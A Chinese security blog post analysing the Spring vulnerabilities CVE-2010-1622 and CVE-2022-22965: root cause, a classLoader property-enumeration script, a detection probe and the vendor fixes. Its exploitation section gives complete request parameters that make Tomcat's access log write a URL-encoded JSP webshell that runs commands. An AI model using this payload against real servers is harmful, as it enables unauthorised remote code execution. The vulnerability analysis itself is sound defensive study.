+<p>Spring框架提供了一种绑定参数和对象的机制，可以把一个类绑定到一个Controller。然后在这个Contraller类中，将一个页面绑定到特定的处理方法中，这个方法可以把页面参数中，与对象成员对应的参数值赋予该成员。</p>
+</blockquote>
+<p>小结<br>
+这个漏洞的成因：</p>
+<ul>
+<li>可以通过Array.set直接对没有setter方法的私有属性赋值</li>
+<li>可以通过调用getClass方法然后再调用getClassLoader获取ClassLoader，并且修改加载类的地址</li>
+</ul>
+<p>该漏洞实际上是一个变量覆盖的漏洞，可以对属性值进行修改，从而造成任意代码执行。</p>
+<h2 id="修复">修复</h2>
+<p>CVE-2010-1622漏洞过后，Spring官方和Tomcat的官方都对漏洞进行了修复。<br>
+Tomcat的做法是，在 6.0.28 版本后把getURLs方法返回的值改成了clone的，这使的我们获得的clone的值无法修改classloader中的URLs[]。<br>
+Spring官方的做法则是在CachedIntrospectionResults中获取beanInfo后对其进行了判断，将classloader添加进了黑名单：<br>
+<img src="https://1jzz.github.io/post-images/1653052516060.png" alt="" loading="lazy"></p>
+<h1 id="cve-2022-22965">CVE-2022-22965</h1>
+<h2 id="环境搭建-2">环境搭建</h2>
+<p>jdk 11.0.10<br>
+spring webmvc 5.3.16<br>
+tomcat 9.0.60</p>
+<h2 id="漏洞分析-2">漏洞分析</h2>
+<p>CVE-2022-22965这漏洞对这个判断进行了绕过，自从JDK 9+开始，JDK引入了模块（Module）的概念，就可以通过module来调用JDK模块下的方法，而module并不在黑名单中，所以能够绕过黑名单。<br>
+如：<code>class.module.classLoader.xxxx</code><br>
+但是Tomcat已经把URL[]的方式给干掉了，应该如何利用呢？<br>
+目前主流的应用方式是通过Tomcat Access Log来写shell。<br>
+在 conf 目录下的 server.xml 文件里可以通过AccessLogValve对Access Log进行配置，如：</p>
+<pre><code class="language-java">&lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;
+    prefix=&quot;localhost_access_log&quot; suffix=&quot;.txt&quot;
+    pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;
+</code></pre>
+<p>然后便会在指定目录下生成localhost_access_log.txt文件<br>
+在Spring中的万物都是SpringBean，那么通过xml文件加载的配置属性，实际上也是可以被配置修改的, 此漏洞POC正是利用了这一点来修改了<code>org.apache.catalina.valves.AccessLogValve</code>中得属性来达到getshell的目的。<br>
+但是我们并不知道这个属性具体是在哪里，所以我们需要去遍历出来，panda师傅写了一个遍历脚本，帮助我们定位到关键的属性在那里可以进行变量覆盖：</p>
+<pre><code class="language-java">@RequestMapping(&quot;/testclass&quot;)
+public void classTest(){
+    HashSet&lt;Object&gt; set = new HashSet&lt;Object&gt;();
+    String poc = &quot;class.moduls.classLoader&quot;;
+    User action = new User();
+    processClass(action.getClass().getClassLoader(),set,poc);
+}
+
+public void processClass(Object instance, java.util.HashSet set, String poc){
+    try {
+        Class&lt;?&gt; c = instance.getClass();
+        set.add(instance);
+        Method[] allMethods = c.getMethods();
+        for (Method m : allMethods) {
+            if (!m.getName().startsWith(&quot;set&quot;)) {
+                continue;
+            }
+            if (!m.toGenericString().startsWith(&quot;public&quot;)) {
+                continue;
+            }
+            Class&lt;?&gt;[] pType  = m.getParameterTypes();
+            if(pType.length!=1) continue;
+
+            if(pType[0].getName().equals(&quot;java.lang.String&quot;)||
+               pType[0].getName().equals(&quot;boolean&quot;)||
+               pType[0].getName().equals(&quot;int&quot;)){
+                String fieldName = m.getName().substring(3,4).toLowerCase()+m.getName().substring(4);
+                System.out.println(poc+&quot;.&quot;+fieldName);
+                //                    System.out.println(m.getName());
+            }
+        }
+        for (Method m : allMethods) {
+            if (!m.getName().startsWith(&quot;get&quot;)) {
+                continue;
+            }
+            if (!m.toGenericString().startsWith(&quot;public&quot;)) {
+                continue;
+            }
+            Class&lt;?&gt;[] pType  = m.getParameterTypes();
+            if(pType.length!=0) continue;
+            if(m.getReturnType() == Void.TYPE) continue;
+            m.setAccessible(true);
+            Object o = m.invoke(instance);
+            if(o!=null)
+            {
+                if(set.contains(o)) continue;
+
+                processClass(o, set, poc+&quot;.&quot;+m.getName().substring(3,4).toLowerCase()+m.getName().substring(4));
+            }
+        }
+    } catch (IllegalAccessException | InvocationTargetException x) {
+        x.printStackTrace();
+    }
+}
+</code></pre>
+<p>简单的对这个脚本进行理解一下：</p>
+<ol>
+<li>先是new了一个User对象，并且获取了加载该类的ClassLoader。与其对应的poc——<code>class.module.classloader</code>可以获取到加载该类的Classloader</li>
+<li>在processClass方法中对这个ClassLoader类的方法进行遍历，以set开头、被public修饰、参数列表中只有一个参数、该参数的类型为	String或者Boolean或者int。最终将这些拥有setter方法的属性进行输出，格式则是最终我们将传入并且赋值的参数</li>
+<li>接着遍历以get开头、被public修饰、没有传入参数、返回类型不为void的方法。然后执行这个get方法，如果返回的内容不为空，并且在HashSet中没有包含这个对象时接着对这个对象进行遍历setter方法，并且对getter返回的对象里存在setter方法的属性进行输出</li>
+</ol>
+<p>然后我们就可以对我们需要的关键参数进行定位了，最终找到了directory、prefix、suffix这三个关键属性的赋值poc。<br>
+<img src="https://1jzz.github.io/post-images/1653052531216.png" alt="" loading="lazy"></p>
+<pre><code>class.moduls.classLoader.resources.context.parent.pipeline.first.prefix
+class.moduls.classLoader.resources.context.parent.pipeline.first.suffix
+class.moduls.classLoader.resources.context.parent.pipeline.first.directory
+class.moduls.classLoader.resources.context.parent.pipeline.first.pattern
+class.classLoader.resources.context.parent.pipeline.first.fileDateFormat =
+</code></pre>
+<h2 id="利用">利用</h2>
+<pre><code>class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
+class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%24%7b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%22%69%6e%70%75%74%53%74%72%65%61%6d%22%2c%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%70%61%72%61%6d%2e%63%6d%64%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%3b%54%68%72%65%61%64%2e%73%6c%65%65%70%28%31%30%30%30%29%3b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%22%69%6e%70%75%74%53%74%72%65%61%6d%41%76%61%69%6c%61%62%6c%65%22%2c%20%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%69%6e%70%75%74%53%74%72%65%61%6d%22%29%2e%61%76%61%69%6c%61%62%6c%65%28%29%29%3b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%22%62%79%74%65%42%75%66%66%65%72%43%6c%61%73%73%22%2c%20%43%6c%61%73%73%2e%66%6f%72%4e%61%6d%65%28%22%6a%61%76%61%2e%6e%69%6f%2e%42%79%74%65%42%75%66%66%65%72%22%29%29%3b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%22%61%6c%6c%6f%63%61%74%65%4d%65%74%68%6f%64%22%2c%20%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%62%79%74%65%42%75%66%66%65%72%43%6c%61%73%73%22%29%2e%67%65%74%4d%65%74%68%6f%64%28%22%61%6c%6c%6f%63%61%74%65%22%2c%20%49%6e%74%65%67%65%72%2e%54%59%50%45%29%29%3b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%22%68%65%61%70%42%79%74%65%42%75%66%66%65%72%22%2c%20%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%61%6c%6c%6f%63%61%74%65%4d%65%74%68%6f%64%22%29%2e%69%6e%76%6f%6b%65%28%6e%75%6c%6c%2c%20%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%69%6e%70%75%74%53%74%72%65%61%6d%41%76%61%69%6c%61%62%6c%65%22%29%29%29%3b%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%69%6e%70%75%74%53%74%72%65%61%6d%22%29%2e%72%65%61%64%28%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%68%65%61%70%42%79%74%65%42%75%66%66%65%72%22%29%2e%61%72%72%61%79%28%29%2c%20%30%2c%20%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%69%6e%70%75%74%53%74%72%65%61%6d%41%76%61%69%6c%61%62%6c%65%22%29%29%3b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%22%62%79%74%65%41%72%72%54%79%70%65%22%2c%20%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%68%65%61%70%42%79%74%65%42%75%66%66%65%72%22%29%2e%61%72%72%61%79%28%29%2e%67%65%74%43%6c%61%73%73%28%29%29%3b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%22%73%74%72%69%6e%67%43%6c%61%73%73%22%2c%20%43%6c%61%73%73%2e%66%6f%72%4e%61%6d%65%28%22%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%22%29%29%3b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%22%73%74%72%69%6e%67%43%6f%6e%73%74%72%75%63%74%6f%72%22%2c%20%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%73%74%72%69%6e%67%43%6c%61%73%73%22%29%2e%67%65%74%43%6f%6e%73%74%72%75%63%74%6f%72%28%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%62%79%74%65%41%72%72%54%79%70%65%22%29%29%29%3b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%22%73%74%72%69%6e%67%52%65%73%22%2c%20%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%73%74%72%69%6e%67%43%6f%6e%73%74%72%75%63%74%6f%72%22%29%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%68%65%61%70%42%79%74%65%42%75%66%66%65%72%22%29%2e%61%72%72%61%79%28%29%29%29%3b%70%61%67%65%43%6f%6e%74%65%78%74%2e%67%65%74%41%74%74%72%69%62%75%74%65%28%22%73%74%72%69%6e%67%52%65%73%22%29%7d
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1
+</code></pre>
+<p><img src="https://1jzz.github.io/post-images/1653053192091.png" alt="" loading="lazy"><br>
+探测：<br>
+还如设置class.module.classLoader.DefaultAssertionStatus=x，x为 0、1 时正常，其他值的时候，返回400，说明就有漏洞，但如果设置了统一的报错信息，那也无法探测到。<br>
+<img src="https://1jzz.github.io/post-images/1653053188539.png" alt="" loading="lazy"></p>
+<h2 id="修复-2">修复</h2>
+<p>spring 修复方法：<br>
+通过对比 Spring 5.3.17 和 5.3.18 的版本，可以看到对CachedIntrospectionResults构造函数中 Java Bean 的PropertyDescriptor的过滤条件被修改了：当 Java Bean 的类型为<code>java.lang.Class</code>时，仅允许获取name以及Name后缀的属性描述符。<br>
+<img src="https://1jzz.github.io/post-images/1653052573368.png" alt="" loading="lazy"><br>
+tomcat修复方法：<br>
+通过对比Tomcat 9.0.61和9.0.62的版本，可以看到对getResource()方法的返回值做了修改，直接返回null。WebappClassLoaderBase即ParallelWebappClassLoader的父类，利用<code>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</code>的链路就走不通了。<br>
+<img src="https://1jzz.github.io/post-images/1653052579157.png" alt="" loading="lazy"></p>
+<h1 id="参考">参考</h1>
+<p><a href="http://tttang.com/archive/1532/">http://tttang.com/archive/1532/</a><br>
+<a href="http://rui0.cn/archives/1158">http://rui0.cn/archives/1158</a><br>
+<a href="https://cloud.tencent.com/developer/article/1035297">https://cloud.tencent.com/developer/article/1035297</a><br>
+<a href="https://www.anquanke.com/post/id/267124">https://www.anquanke.com/post/id/267124</a><br>
+<a href="https://juejin.cn/post/6844904177156489229">https://juejin.cn/post/6844904177156489229</a><br>
+<a href="https://cloud.tencent.com/developer/article/1376303">https://cloud.tencent.com/developer/article/1376303</a><br>
+<a href="https://juejin.cn/post/6969034239199150087">https://juejin.cn/post/6969034239199150087</a><br>
+<a href="https://wooyun.js.org/drops/Spring%E6%A1%86%E6%9E%B6%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/Spring%E6%A1%86%E6%9E%B6%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90.html</a><br>
+<a href="https://xz.aliyun.com/t/11281">https://xz.aliyun.com/t/11281</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#cve-2010-1622">CVE-2010-1622</a>
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li>
+<li><a href="#spring%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">spring代码分析</a>
+<ul>
+<li><a href="#spring-mvc%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B">spring mvc的执行流程</a></li>
+</ul>
+</li>
+<li><a href="#java-bean">java Bean</a>
+<ul>
+<li><a href="#%E5%86%85%E7%9C%81introspector">内省(Introspector)</a>
+<ul>
+<li><a href="#introspector%E7%B1%BB">Introspector类</a></li>
+<li><a href="#beaninfo%E7%B1%BB">BeanInfo类</a></li>
+<li><a href="#propertydescriptor%E7%B1%BB">PropertyDescriptor类</a></li>
+<li><a href="#propertyeditor%E7%B1%BB">PropertyEditor类</a></li>
+</ul>
+</li>
+<li><a href="#spring-bean">Spring Bean</a>
+<ul>
+<li><a href="#%E8%B0%83%E7%94%A8%E6%9E%84%E9%80%A0%E5%99%A8%E5%88%9B%E5%BB%BAbean%E5%AF%B9%E8%B1%A1%E5%AE%9E%E9%99%85%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8">调用构造器创建Bean对象(实际开发常用)</a></li>
+<li><a href="#spring-bean%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B">Spring bean加载流程</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#spring%E5%8F%82%E6%95%B0%E7%BB%91%E5%AE%9A%E5%AF%B9%E8%B1%A1%E4%BB%A5%E5%8F%8A%E8%B5%8B%E5%80%BC%E6%B5%81%E7%A8%8B">spring参数绑定对象以及赋值流程</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+<li><a href="#%E4%BF%AE%E5%A4%8D">修复</a></li>
+</ul>
+</li>
+<li><a href="#cve-2022-22965">CVE-2022-22965</a>
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-2">环境搭建</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2">漏洞分析</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8">利用</a></li>
+<li><a href="#%E4%BF%AE%E5%A4%8D-2">修复</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/FyZqWo_OL/">
+              <h3 class="post-title">
+                ZeroLogon(CVE-2020-1472)利用以及分析
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
